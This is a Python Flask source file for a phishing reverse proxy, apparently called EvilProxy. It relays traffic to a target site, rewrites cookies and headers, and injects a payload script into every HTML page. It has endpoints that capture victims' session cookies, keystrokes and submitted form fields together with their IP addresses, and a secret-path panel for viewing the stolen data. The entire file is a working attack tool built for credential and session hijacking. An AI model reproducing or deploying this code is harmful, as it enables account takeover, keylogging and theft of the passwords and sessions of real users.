from flask import Flask, request, Response, send_from_directory, jsonify
import requests, re, json, os
from datetime import datetime
import brotli

# Initialize storage
if not os.path.exists('cookies.json'):
    with open('cookies.json', 'w') as f:
        json.dump([], f)

if not os.path.exists('requests.json'):
    with open('requests.json', 'w') as f:
        json.dump([], f)

requests_history = []
MAX_HISTORY = 50

def start_proxy(target, host, port, secret):
    app = Flask(__name__)

    @app.route(f'/{secret}')
    def panel_index():
        return send_from_directory('panel', 'index.html')

    @app.route(f'/ep/assets/EvilProxyBanner.png')
    def panel_banner():
        return send_from_directory('panel', 'EvilProxyBanner.png')

    @app.route('/payload-script.js')
    def payload():
        return send_from_directory('.', 'payload-script.js')

    @app.route('/ep/api/ping', methods=['POST'])
    def eat_cookie():
        cookies = request.cookies
        user_ip = request.remote_addr
        timestamp = datetime.now().isoformat()

        cookie_data = []
        for key, value in cookies.items():
            cookie_data.append({
                'name': key,
                'value': value,
                'timestamp': timestamp,
                'ip': user_ip
            })

        with open('cookies.json', 'r') as f:
            existing_cookies = json.load(f)

        existing_cookies.extend(cookie_data)

        with open('cookies.json', 'w') as f:
            json.dump(existing_cookies, f)

        return jsonify({'message': 'Pong!'}), 200

    @app.route('/ep/api/getCookies', methods=['GET'])
    def get_cookies():
        with open('cookies.json', 'r') as f:
            cookies = json.load(f)

        response_data = []
        for cookie in cookies:
            logged_time = datetime.fromisoformat(cookie['timestamp'])
            time_diff = datetime.now() - logged_time
            seconds_ago = time_diff.total_seconds()
            
            if seconds_ago < 60:
                time_str = f'Logged: {int(seconds_ago)} seconds ago'
            elif seconds_ago < 3600:
                time_str = f'Logged: {int(seconds_ago // 60)} minutes ago'
            else:
                time_str = f'Logged: {int(seconds_ago // 3600)} hours ago'

            response_data.append({
                'name': cookie['name'],
                'value': cookie['value'],
                'timestamp': time_str,
                'ip': cookie.get('ip', 'unknown')
            })

        return jsonify(response_data), 200

    @app.route('/ep/api/serverInfo', methods=['GET'])
    def get_server_info():
        return jsonify({
            'target': target,
            'host': host,
            'port': str(port)
        }), 200

    @app.route('/ep/api/requests', methods=['GET'])
    def get_requests():
        return jsonify(requests_history[-MAX_HISTORY:])

    @app.route('/ep/api/clearCookies', methods=['POST'])
    def clear_cookies():
        with open('cookies.json', 'w') as f:
            json.dump([], f)
        return jsonify({'status': 'success'})

    @app.route('/ep/api/clearHistory', methods=['POST'])
    def clear_history():
        global requests_history
        requests_history = []
        return jsonify({'status': 'success'})

    @app.route('/ep/api/removeRequest', methods=['POST'])
    def remove_request():
        data = request.json
        timestamp = data.get('timestamp')
        
        global requests_history
        requests_history = [req for req in requests_history if req['timestamp'] != timestamp]
        
        return jsonify({'status': 'success'})

    @app.route('/ep/api/keylog', methods=['POST'])
    def keylog():
        data = request.json
        timestamp = datetime.now().isoformat()
        log_entry = {
            'keys': data['keys'],
            'url': data['url'],
            'timestamp': timestamp,
            'ip': request.remote_addr
        }
        
        with open('keylogs.json', 'a+') as f:
            f.write(json.dumps(log_entry) + '\n')
        
        return jsonify({'status': 'success'})

    @app.route('/ep/api/forms', methods=['POST'])
    def log_form():
        data = request.json
        timestamp = datetime.now().isoformat()
        log_entry = {
            'fields': data['fields'],
            'url': data['url'],
            'timestamp': timestamp,
            'ip': request.remote_addr
        }
        
        with open('forms.json', 'a+') as f:
            f.write(json.dumps(log_entry) + '\n')
        
        return jsonify({'status': 'success'})

    @app.route('/ep/api/getLogs', methods=['GET'])
    def get_logs():
        log_type = request.args.get('type', 'all')
        logs = {
            'keylogs': [],
            'forms': []
        }
        
        if os.path.exists('keylogs.json'):
            with open('keylogs.json', 'r') as f:
                logs['keylogs'] = [json.loads(line) for line in f]
            
        if os.path.exists('forms.json'):
            with open('forms.json', 'r') as f:
                logs['forms'] = [json.loads(line) for line in f]
        
        if log_type != 'all':
            return jsonify(logs[log_type])
        return jsonify(logs)

    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
    def proxy(path):
        target_url = f"https://{target}/{path}"

        headers = {key: value for key, value in request.headers if key.lower() != 'host'}
        headers['Host'] = target

        if 'Cookie' in request.headers:
            cookies = request.headers['Cookie'].replace(host, target)
            headers['Cookie'] = cookies

        try:
            resp = requests.request(
                request.method,
                target_url,
                headers=headers,
                params=request.args,
                data=request.form,
                allow_redirects=False
            )

            # Log request
            request_log = {
                'timestamp': datetime.now().isoformat(),
                'method': request.method,
                'path': path,
                'status_code': resp.status_code,
                'ip': request.remote_addr
            }
            requests_history.append(request_log)
            if len(requests_history) > MAX_HISTORY:
                requests_history.pop(0)

            response_headers = {
                key: value for key, value in resp.headers.items() 
                if key.lower() not in ['content-encoding', 'transfer-encoding', 'content-length', 'date', 'server']
            }

            resp_content = resp.content
            if 'content-encoding' in resp.headers and 'br' in resp.headers['content-encoding']:
                try:
                    resp_content = brotli.decompress(resp.content)
                except brotli.error:
                    pass

            if 'content-type' in resp.headers and 'text/html' in resp.headers['content-type']:
                resp_content = resp_content.decode('utf-8')
                resp_content = re.sub(r'<head>', r'<head><script src="/payload-script.js"></script>', resp_content)
                resp_content = resp_content.encode('utf-8')

            for key in response_headers:
                response_headers[key] = response_headers[key].replace(target, host)

            return Response(resp_content, status=resp.status_code, headers=response_headers)

        except requests.exceptions.RequestException as e:
            return Response(f"Error: {str(e)}", status=500)

    app.run(host=host, port=port)